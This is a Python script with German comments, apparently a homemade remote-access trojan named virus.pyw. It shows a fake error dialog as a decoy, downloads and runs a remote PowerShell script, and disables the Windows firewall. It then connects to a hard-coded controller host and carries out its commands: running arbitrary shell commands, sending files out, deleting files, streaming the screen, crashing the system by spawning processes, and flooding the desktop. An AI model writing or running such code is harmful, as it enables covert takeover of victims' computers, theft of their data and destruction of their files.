#Befehlliste
#view_cwd zeigt alle dateien in dem verzeichniss in dem das script ausgeführt wurde.

import subprocess
import os
import shutil
import socket
from random import randint
import getpass
from tkinter import *
from tkinter import messagebox
import time
from vidstream import * #pip install vidstream, pillow
import threading


window = Tk()
window.eval('tk::PlaceWindow %s center' % window.winfo_toplevel())
window.withdraw()
messagebox.showerror('Error [winErr01100]', 'Beim Ausführen des Programmes ist ein Fehler aufgetreten.')

window.deiconify()
window.destroy()
window.quit()
command = '''@"%SystemRoot%\System32\WindowsPowerShell\\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))" && SET "PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\\bin'''
os.system(command)


#subprocess.call('icacls C:\\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu /grant everyone:(f) /t /c')
path_dir = 'C:\\Users\\' + getpass.getuser() + '\Desktop'
print(path_dir)
original = os.getcwd() + "\\virus.pyw"
target = "C:\\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu"
#subprocess.call('copy-Item C:\\Users\Administrator\Desktop\Virus.pyw -Destination "C:\\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs" -Force')


subprocess.call('netsh advfirewall set allprofiles state off')
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '10.0.10.47'
port = 22
s.connect((str(host), port))


print("")
print("Erfolgreich mit dem Server verbunden")
print("")

#Verbindung wurde aufgebaut

#Befehl erhalten und ausführen
print(s.getsockname()[0])
while 1:
    command = s.recv(1024)
    command = command.decode()
    print("Befehl wurde entgegen genommen")
    print("")


    if command == "view_cwd":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
        print("Befehl wurde erfolgreich ausgeführt")

    elif command == "custom_dir":
        print("beliebiges verzeichniss")
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        print(files)
        s.send(files.encode())
        print(files.encode())
        print("")
        print("Befehl wurde erfolgreich ausgeführt")

    elif command == "run":
        print("cmd wird ausgeführt")
        user_input = s.recv(5000)
        user_input = user_input.decode()
        os.system('powershell.exe start ' + user_input) ##Funktioniert nicht muss mit os Gemacht werden.

        print("Befehl wurde erfolgreich ausgeführt")


    elif command == "download_file":
        file_path = s.recv(5000)
        file_path = file_path.decode()
        files = open(file_path, "rb")
        data = files.read()
        s.send(data)
        print("")
        print("Datei wurde erfolgreich gesendet.")


    elif command == "remove_file":
        fileanddir = s.recv(5000)
        fileanddir = fileanddir.decode()
        os.remove(fileanddir)
        print("")
        print("Datei wurde erfolgreich entfernt.")

    elif command == "crash":
        for i in range (5000):
            os.system('start')

    elif command == "spam_desktop":
        Anzahl = s.recv(5000)
        Anzahl = Anzahl.decode()
        name = s.recv(5000)
        name = name.decode()
        for i in range (int(Anzahl)):
            directory = name + str(randint(0, 10000))
            os.mkdir(os.path.join(path_dir, directory))
            time.sleep(0.1)

    elif command == "cmd":
        print("cmd wird ausgeführt")
        user_input = s.recv(5000)
        user_input = user_input.decode()
        file = os.popen(user_input).read() ##Funktioniert nicht muss mit os Gemacht werden.
        file = file.encode()
        s.send(file)

        print("Befehl wurde erfolgreich ausgeführt")


    elif command == "error":
        print("cmd wird ausgeführt")
        anzahl = s.recv(5000)
        anzahl = anzahl.decode()
        for i in range (int(anzahl)):
            window = Tk()
            window.eval('tk::PlaceWindow %s center' % window.winfo_toplevel())
            window.withdraw()
            messagebox.showerror('Error [winErr01100]', 'Beim Ausführen des Programmes ist ein Fehler aufgetreten.')
            time.sleep(0.3)

        print("Befehl wurde erfolgreich ausgeführt")


    elif command == "screenshare":
        print("cmd wird ausgeführt")
        ip = os.popen('s.getsockname()[0]').read()
        ip = ip.encode()
        s.send(ip)
        time.sleep(1)
        sender = ScreenShareClient('10.0.10.47', 9999)
        t = threading.Thread(target=sender.start_stream)
        print("3")
        t.start()
        print("4")


    else:
        print("")
        print("Befehl wurde nicht gefunden...")